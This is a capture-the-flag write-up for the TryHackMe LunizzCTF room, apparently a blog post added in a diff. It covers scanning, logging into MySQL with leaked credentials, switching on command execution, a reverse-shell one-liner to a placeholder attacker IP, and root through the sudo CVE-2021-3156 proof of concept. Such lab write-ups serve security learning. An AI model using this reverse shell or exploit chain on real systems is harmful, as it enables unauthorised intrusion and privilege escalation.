@@ -1,0 +1,140 @@
+I"�<h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled <code>LunizzCTF</code> with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about boot2root, Web Exploitation and Privilage escalation with CVE. room link <a href="https://tryhackme.com/room/lunizzctfnd">here</a></p>
+
+<blockquote>
+  <p>I just tried poc from sudo and I do not recommend you to use this method :D</p>
+</blockquote>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>First let’s scanning this box with nmap :</p>
+<pre><code>$ nmap 10.10.106.87 -sC -sV 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 18:54 WIB
+Nmap scan report for 10.10.106.87
+Host is up (0.37s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
+|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
+|_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3306/tcp open  mysql      MySQL 5.7.32-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.32-0ubuntu0.18.04.1
+|   Thread ID: 5
+|   Capabilities flags: 65535
+|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, FoundRows, LongColumnFlag, ODBCClient, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsCompression, Speaks41ProtocolOld, LongPassword, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: EiV\x0F#\x023-J\x02\x13m\x07M\x7F\x12\x10\x13GW
+|_  Auth Plugin Name: mysql_native_password
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.32_Auto_Generated_Server_Certificate
+| Not valid before: 2020-12-10T19:29:01
+|_Not valid after:  2030-12-08T19:29:01
+|_ssl-date: TLS randomness does not represent time
+4444/tcp open  tcpwrapped
+5000/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.76 seconds
+</code></pre>
+<p>After that, nmap show us the port open. As you can see the box have 5 port, i want to check directory with gobuster at webserver. and there is the result :</p>
+
+<pre><code>$ gobuster dir -u 10.10.65.37 -w /usr/share/dirb/wordlists/big.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.65.37
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/01 21:56:18 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/whatever (Status: 301)
+
+</code></pre>
+<p>I found directory <code>/whatever</code> there is the page :</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_1.png" alt="img" /></p>
+
+<p>And we can’t put any command in here. After i’m scanning again with extension txt and php i found <code>instruction.txt</code> and contain credentials user mysql:</p>
+<pre><code>$ gobuster dir -u 10.10.65.37 -w /usr/share/dirb/wordlists/big.txt -x php,txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.65.37
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt
+[+] Timeout:        10s
+===============================================================
+2021/03/01 21:56:59 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/hidden (Status: 301)
+/index.php (Status: 200)
+/instructions.txt (Status: 200)
+</code></pre>
+
+<p><img src="/assets/thm_lunizzctf/bg_2.png" alt="img" /></p>
+
+<h2 id="getting-credentials">Getting Credentials</h2>
+
+<h3 id="login-mysql">Login mysql</h3>
+<p>Now let’s login mysql with credentials in <code>instructions.txt</code> and looking for something interesting.</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_3.png" alt="img" /></p>
+
+<p>then i found this :</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_4.png" alt="img" /></p>
+
+<p>it’s must be value of <code>/whatever</code> to command execute we must change the ‘0’ to ‘1’.</p>
+
+<p><code>update runcheck set runornot = 1;</code></p>
+
+<p><img src="/assets/thm_lunizzctf/bg_5.png" alt="img" /></p>
+
+<p>Then let’s check command in <code>/whatever</code>.</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_6.png" alt="img" /></p>
+
+<h3 id="getting-shell-web">Getting Shell web</h3>
+
+<p>Its work now. Let’s put revershell to getting <code>www-data</code>, you can use <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code>.</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_7.png" alt="img" /></p>
+
+<p>We got revershell now</p>
+
+<h2 id="privilage-escalations">Privilage Escalations</h2>
+
+<p>In This challange i want to use Sudo CVE and you can get it in <a href="https://github.com/blasty/CVE-2021-3156">here</a>.</p>
+
+<p><img src="/assets/thm_lunizzctf/bg_8.png" alt="img" /></p>
+
+<p>Now we can get root easily .there is the little miss configuration in sudo(Lower version) but in the future it will be fixed by the maker. here I just tried poc from sudo and I do not recommend you to use this method.</p>
+
+<p>Happy hacking :D .</p>
+:ET
